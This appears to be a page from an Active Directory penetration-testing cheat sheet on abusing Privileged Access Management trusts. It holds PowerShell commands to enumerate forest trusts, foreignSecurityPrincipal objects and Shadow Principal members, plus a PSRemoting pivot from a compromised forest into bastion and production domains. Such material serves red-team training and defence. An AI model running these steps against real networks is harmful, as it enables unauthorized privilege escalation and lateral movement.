# 🟢 AbusingPAM Trust

Cross Domain Attacks leverage trust relationships between different domains or forests to escalate privileges or gain unauthorized access. Specifically, abusing Privileged Access Management (PAM) Trust involves exploiting the trust established for managing privileged accounts and access within or across Active Directory environments.

Privileged Access Management trusts are designed to isolate the management of privileged accounts to enhance security.&#x20;

However, attackers with administrative access in one domain (e.g., `ad-attacks.local`) can exploit these trusts to gain access to resources in a trusted domain or forest (e.g., `bastion.local`).

Attackers enumerate trusts to identify paths for privilege escalation or lateral movement:

```powershell
Get-ADTrust -Filter *
```

Then, by targeting `foreignSecurityPrincipal` objects, attackers can discover and exploit cross-forest permissions:

```powershell
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

These techniques reveal potential attack paths, allowing attackers to pivot across trusts, compromising additional domains or forests under certain conditions.

### PowerShell

#### 1. Enumerating trusts and hunting for access

> We have DA access to the **techcorp.local** forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the **bastion.local** forest.

```
# PowerView
# From techcorp-dc
Get-ADTrust -Filter * 
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

#### 2. Enumerate if there is a PAM trust

```
# PowerView
$bastiondc = New-PSSession bastion-dc.bastion.local 
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined - eq $False)}} -Session $bastiondc
```

#### 3. Check which users are members of the Shadow Principals

```
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

#### 4. Establish a direct PSRemoting session on bastion-dc and access production.local

```
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```
